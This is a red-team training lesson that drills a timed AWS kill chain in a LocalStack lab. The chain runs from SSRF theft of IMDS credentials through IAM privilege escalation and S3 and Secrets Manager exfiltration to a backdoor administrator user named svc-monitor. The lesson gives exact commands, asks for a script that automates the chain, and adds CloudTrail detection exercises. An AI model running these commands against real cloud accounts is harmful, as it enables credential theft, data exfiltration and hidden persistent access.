---
title: "Cloud Practice — Full Kill Chain Speed Run"
tags: [cloud-practice, AWS, kill-chain, speed-run, SSRF, IAM, S3, persistence,
       end-to-end, timed, LocalStack, muscle-memory, ATT&CK]
module: 04-BroadSurface-02
day: 207
related_topics:
  - Cloud Full Attack Lab (Day 192)
  - IAM Misconfiguration Attacks (Day 183)
  - Cloud Persistence Techniques (Day 191)
  - Cloud Security Review (Day 196)
---

# Day 207 — Cloud Practice: Full Kill Chain Speed Run

> "Speed reveals gaps. When you time yourself, you find out which steps you
> actually know versus which steps you look up every time. The kill chain from
> SSRF to persistence should take under 30 minutes once you have practised it
> enough. Not because attackers are in a hurry — because defenders are watching.
> The longer you are in the environment, the more log entries you generate,
> the more likely a detection fires. Speed is opsec."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Execute the full AWS attack kill chain from initial SSRF to active persistence
   in under 30 minutes without reference materials.
2. Identify which steps you hesitate on — those are your gaps.
3. Write the complete sequence of AWS API calls from memory.
4. Compare your performance across three consecutive runs to measure improvement.
5. Produce a CloudTrail timeline from the lab logs showing your attack.

**Time budget:** 5–6 hours (3 kill chain runs + analysis).

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud Full Attack Lab completed | Day 192 |
| IAM PrivEsc practice completed | Day 197 |
| LocalStack + Docker | Previous setup |
| AWS CLI configured for LocalStack | `export AWS_ENDPOINT_URL=http://localhost:4566` |

---

## Lab Setup

```bash
# Start the kill chain lab environment
cd 04-BroadSurface-02/samples/kill-chain-lab/
docker compose up -d

# Lab provides:
# - A web application with an /fetch?url= SSRF endpoint
# - An EC2-like instance with IMDSv1 enabled (LocalStack simulation)
# - IAM: a role with iam:PassRole + lambda:CreateFunction
# - S3: one public bucket, one private bucket with sensitive data
# - CloudTrail: logging all events to LocalStack S3

# Starting condition: you have found an SSRF vulnerability
# Endpoint: http://localhost:8080/fetch?url=

# Objective:
# 1. Extract IMDS credentials
# 2. Enumerate IAM permissions
# 3. Escalate to admin
# 4. Exfiltrate data from private S3 bucket
# 5. Plant persistence (backdoor user)
# 6. Done — record your time

source .env
```

---

## Kill Chain Reference (Read Once, Then Cover It)

Before the first run, read this once. Then cover it and do not look at it again.

```
Phase 1 — SSRF to IMDS (Target: < 3 min)
  http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  → get role name
  → http://.../.../security-credentials/{role-name}
  → extract AccessKeyId, SecretAccessKey, Token

Phase 2 — Configure and enumerate (Target: < 5 min)
  export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
  aws sts get-caller-identity
  aws iam list-attached-role-policies --role-name {role}
  aws iam get-policy-version --policy-arn ... --version-id v1

Phase 3 — Privilege escalation (Target: < 8 min)
  Identify path from enumeration:
    iam:CreatePolicyVersion → create-policy-version → set-default-policy-version
    OR iam:PassRole + Lambda → create function → invoke → extract admin key

Phase 4 — Exfiltration (Target: < 5 min)
  aws s3 ls → identify target bucket
  aws s3 cp s3://{bucket}/sensitive-data.json .
  aws secretsmanager list-secrets
  aws secretsmanager get-secret-value --secret-id {name}

Phase 5 — Persistence (Target: < 5 min)
  aws iam create-user --user-name svc-monitor
  aws iam attach-user-policy --user-name svc-monitor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  aws iam create-access-key --user-name svc-monitor
  → record the new key pair
```

---

## Run 1 — Untimed Warm-Up

Do the full kill chain at a comfortable pace. No timer. Focus on correctness.
Use notes freely.

```
Checkpoint 1: SSRF response received — credentials extracted
  [ ] AccessKeyId starts with ASIA (temporary, role-based)
  [ ] SecretAccessKey and SessionToken captured

Checkpoint 2: Caller identity confirmed
  [ ] aws sts get-caller-identity returns expected role ARN
  [ ] Permissions enumerated — escalation path identified

Checkpoint 3: Admin access achieved
  [ ] aws iam list-users returns all users
  [ ] Confirm you can read from previously inaccessible resources

Checkpoint 4: Data exfiltrated
  [ ] Contents of private S3 bucket retrieved locally
  [ ] Secret value from Secrets Manager retrieved

Checkpoint 5: Persistence planted
  [ ] Backdoor user exists: aws iam get-user --user-name svc-monitor
  [ ] Access key created and recorded
  [ ] Backdoor key tested: aws sts get-caller-identity with new key
```

Record: total time _______ min.

---

## Run 2 — Timed, No Notes

Reset the lab:

```bash
docker compose down && docker compose up -d
source .env
```

**Start timer. No notes. No browser. Memory only.**

Constraints:
- Do not look at previous commands
- Do not use command history from Run 1 (`history -c` before starting)
- Complete all 5 phases
- Stop the timer when the backdoor key is confirmed working

```bash
# Clear history so you cannot cheat with up-arrow
history -c
# Start your timer now.
```

Record:
- Phase 1 time: ___ min
- Phase 2 time: ___ min
- Phase 3 time: ___ min
- Phase 4 time: ___ min
- Phase 5 time: ___ min
- **Total time: ___ min**

**Identify:** which phase took the most time? That is your gap.

---

## Run 3 — Timed Speed Run (Target: < 30 min)

Reset the lab again. Second no-notes run.

```bash
docker compose down && docker compose up -d
source .env
history -c
# Start timer.
```

Record time. Compare to Run 2. Note improvement.

If total time is under 30 minutes: you are kill-chain fluent.
If total time is over 30 minutes: identify the slowest phase and practise that
phase in isolation until it takes less than 5 minutes.

---

## CloudTrail Timeline Analysis

After the runs are complete, pull the CloudTrail log and reconstruct your
attack timeline.

```bash
# Pull CloudTrail logs from LocalStack S3
aws s3 ls s3://cloudtrail-logs/ --recursive
aws s3 cp s3://cloudtrail-logs/AWSLogs/000000000000/CloudTrail/ \
  ./cloudtrail-local/ --recursive

# Parse the timeline
cat cloudtrail-local/**/*.json | \
  jq -r '.Records[] | [.eventTime, .userIdentity.arn,
          .eventSource, .eventName] | @tsv' | \
  sort -k1 | column -t
```

Analyse your timeline:

| Time | Principal | Event | Phase |
|---|---|---|---|
| T+0:00 | AppServer | (SSRF internal) | 1 |
| T+0:30 | AssumedRole/ec2-app-role | GetCallerIdentity | 2 |
| T+1:15 | AssumedRole/ec2-app-role | ListAttachedRolePolicies | 2 |
| T+2:40 | AssumedRole/ec2-app-role | CreatePolicyVersion | 3 |
| … | … | … | … |

**Questions to answer from your timeline:**

1. At what event did you cross from Phase 2 to Phase 3?
2. Which event in Phase 5 would be the highest-priority CloudTrail alert?
3. How many distinct `eventName` values appear from your session? How many
   would a detection rule need to correlate to flag your behaviour?

---

## Variation: Multi-Vector Run

After the speed runs, attempt the kill chain with a DIFFERENT escalation path
from the one you used in Runs 1–3.

```bash
# If you used CreatePolicyVersion in Runs 1-3:
# Reset and this time use PassRole + Lambda

# If you used PassRole + Lambda:
# Reset and use CreatePolicyVersion

# This forces you to know both paths, not just one
```

---

## Self-Assessment Grid

| Skill | Run 1 | Run 2 | Run 3 |
|---|---|---|---|
| SSRF → IMDS response parsed | ___ min | ___ min | ___ min |
| AWS credentials exported correctly | yes/no | yes/no | yes/no |
| Permission enumeration complete | ___ min | ___ min | ___ min |
| Escalation path identified | ___ min | ___ min | ___ min |
| Escalation executed | ___ min | ___ min | ___ min |
| S3 exfil completed | ___ min | ___ min | ___ min |
| Persistence verified | ___ min | ___ min | ___ min |
| **Total** | ___ min | ___ min | ___ min |

---

## Key Takeaways

1. **Repetition builds fluency.** The first run uses notes. The third run does
   not. The difference in time measures how much you actually know. Gaps in
   knowledge cost minutes. In a real engagement under detection pressure,
   minutes matter.
2. **Phase enumeration is always the bottleneck.** Knowing that you have
   `iam:PassRole` is worthless if you do not know the ARN of a high-privilege
   role to pass it to. Thorough enumeration in Phase 2 speeds up every
   subsequent phase.
3. **The CloudTrail timeline is the attacker's footprint.** Everything you did
   is in there. A defender running the same timeline analysis you did today
   would reconstruct your attack in minutes. Your only advantages: time delay
   (alerts take seconds, not milliseconds) and noise volume.
4. **Two escalation paths > one.** If your preferred path is blocked (the
   role you need is protected by a permission boundary), you need a fallback.
   Know `CreatePolicyVersion` AND `PassRole + Lambda` AND role chaining.
5. **Speed under constraints is a skill.** The constraints today (no notes,
   cleared history) simulate operational pressure. If you cannot execute
   cleanly under low-stakes constraints, you will not execute cleanly in a
   real engagement where the stakes are higher.

---

## Exercises

1. Write a single bash script that automates the entire kill chain from SSRF
   URL to backdoor access key. The script should: (a) accept the SSRF endpoint
   as a parameter, (b) auto-detect the escalation path by checking permissions,
   (c) output the backdoor credentials to stdout.

2. Time your script on Run 4. How does automated execution compare to manual?
   What does the CloudTrail timeline look like for automated vs manual execution?
   Which produces more or less log noise?

3. Write the detection query that would fire on your attack. Use jq or SQL.
   The query should identify: SSRF-extracted credentials (ASIA* key used from
   non-EC2 IP) followed by rapid IAM enumeration in the same session.

4. Research: what is the AWS CloudTrail event for `sts:AssumeRoleWithWebIdentity`?
   How does a Kubernetes pod using IRSA (IAM Roles for Service Accounts) appear
   in CloudTrail? How would you distinguish a legitimate IRSA call from an
   attacker using a stolen IRSA token?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q207.1, Q207.2 …).
> Follow-up questions use hierarchical numbering (Q207.1.1, Q207.1.2 …).

---

## Navigation

← Previous: [Day 206 — Cloud Practice: Container and Kubernetes](DAY-0206-Cloud-Practice-Container-Kubernetes.md)
→ Next: [Day 208 — Cloud Practice: Mock Bug Bounty Engagement](DAY-0208-Cloud-Practice-Mock-Bug-Bounty.md)
